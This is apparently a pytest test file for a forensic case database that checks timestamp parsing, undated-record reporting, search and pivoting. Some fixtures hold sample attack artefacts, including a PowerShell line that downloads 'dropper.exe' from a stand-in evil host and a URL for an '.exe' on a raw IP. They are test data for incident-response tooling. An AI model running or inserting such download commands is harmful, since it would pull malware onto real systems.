import sqlite3

import pytest

from copilot.database import CaseDatabase, SchemaError


@pytest.fixture
def db(tmp_path):
    return CaseDatabase(str(tmp_path))


def test_mixed_timestamp_formats_all_land_in_window(db):
    # The exact rows that went missing with the original string comparison.
    rows = [
        {"EventTime": "2026-10-05T10:00:00Z", "Message": "rfc3339 Z"},
        {"EventTime": "2026-10-05T10:00:00.123456789+00:00", "Message": "offset form"},
        {"EventTime": 1791194400, "Message": "epoch int"},
        {"Created0x10": "2026-10-05T03:00:00-07:00", "Message": "local offset"},
    ]
    db.ingest_artifact_results(rows, "Test.Src", client_id="C.1")
    res = db.query_timeline("2026-10-05T09:59:00Z", "2026-10-05T10:01:00Z")
    assert res["total"] == 4
    assert sorted(e["description"] for e in res["events"]) == ["epoch int", "local offset", "offset form", "rfc3339 Z"]


def test_undated_records_are_reported_not_dropped(db):
    db.ingest_artifact_results([{"Line": "iwr http://evil-empire.local/dropper.exe"}],
                               "Windows.System.Powershell.PSReadline", client_id="C.1")
    res = db.query_timeline("2026-10-05T00:00:00Z", "2026-10-07T00:00:00Z")
    assert res["total"] == 0
    assert res["undated"] == [{"source": "Windows.System.Powershell.PSReadline", "records": 1}]
    hit = db.search_events("dropper.exe")["records"][0]
    assert hit["command_line"] == "iwr http://evil-empire.local/dropper.exe"
    assert hit["event_type"] == "command_history"


def test_search_is_case_insensitive_substring_with_totals(db):
    db.ingest_artifact_results([{"Message": f"connect to EVIL-Empire.local #{i}"} for i in range(5)],
                               "Test.Src", client_id="C.1")
    res = db.search_events("evil-empire", limit=2)
    assert res["total"] == 5 and len(res["records"]) == 2
    assert db.search_events("no-such-thing")["total"] == 0
    assert db.search_events("#3")["total"] == 1  # under 3 chars falls back to LIKE


def test_search_treats_wildcards_literally(db):
    db.ingest_artifact_results([{"Message": "100% done"}, {"Message": "1000 done"}], "S", client_id="C.1")
    assert db.search_events("0%")["total"] == 1


def test_pivot_by_field(db):
    db.ingest_artifact_results([
        {"UserName": "jdoe", "Message": "logon"},
        {"UserName": "admin", "Message": "jdoe mentioned in text"},
    ], "S", client_id="C.1")
    assert db.pivot_entity("jdoe", "user")["total"] == 1
    assert db.pivot_entity("jdoe")["total"] == 2
    with pytest.raises(ValueError):
        db.pivot_entity("x", "nonsense")


def test_timeline_limit_reports_total(db):
    rows = [{"EventTime": f"2026-10-05T10:{m:02d}:00Z", "Message": str(m)} for m in range(30)]
    db.ingest_artifact_results(rows, "S", client_id="C.1")
    res = db.query_timeline(limit=10)
    assert res["total"] == 30 and len(res["events"]) == 10
    assert res["events"][0]["description"] == "0"


def test_detail_includes_all_timestamps(db):
    db.ingest_artifact_results([{"Created": "2026-10-05T10:00:00Z", "Modified": "2026-10-05T11:00:00Z"}],
                               "S", client_id="C.1")
    eid = db.query_timeline()["events"][0]["evidence_id"]
    detail = db.get_event_detail(eid)
    assert [t["timestamp_desc"] for t in detail["timestamps"]] == ["Created", "Modified"]


def test_stats(db):
    db.ingest_artifact_results([{"EventTime": "2026-10-05T10:00:00Z"}, {"Line": "x"}], "S", client_id="C.1")
    stats = db.get_stats()
    assert stats["total_records"] == 2 and stats["undated_records"] == 1 and stats["timeline_events"] == 1


def test_old_database_is_refused_with_clear_message(tmp_path):
    conn = sqlite3.connect(str(tmp_path / "case.db"))
    conn.execute("CREATE TABLE events (evidence_id TEXT)")
    conn.commit()
    conn.close()
    with pytest.raises(SchemaError, match="older DFIR Copilot version"):
        CaseDatabase(str(tmp_path))


def test_search_index_is_small_but_finds_nested_values(db):
    big = "A" * 100000
    db.ingest_artifact_results([{"EventData": {"Payload": big, "Url": "http://194.61.24.102/coreupdater.exe"}}],
                               "S", client_id="C.1")
    indexed = db.conn.execute("SELECT length(text) FROM records_fts").fetchone()[0]
    assert indexed < 7000
    assert db.search_events("194.61.24.102")["total"] == 1


def test_activity_histogram(db):
    rows = [{"EventTime": "2020-09-19T02:35:00Z", "Message": "a"}, {"EventTime": "2020-09-19T02:40:00Z", "Message": "b"},
            {"EventTime": "2020-09-19T05:00:00Z", "Message": "c"}]
    db.ingest_artifact_results(rows, "Windows.EventLogs.RDPAuth", client_id="C.1")
    assert db.activity_histogram(bucket="hour") == [
        {"bucket": "2020-09-19T02", "event_type": "authentication", "events": 2},
        {"bucket": "2020-09-19T05", "event_type": "authentication", "events": 1},
    ]
    with pytest.raises(ValueError):
        db.activity_histogram(bucket="week")
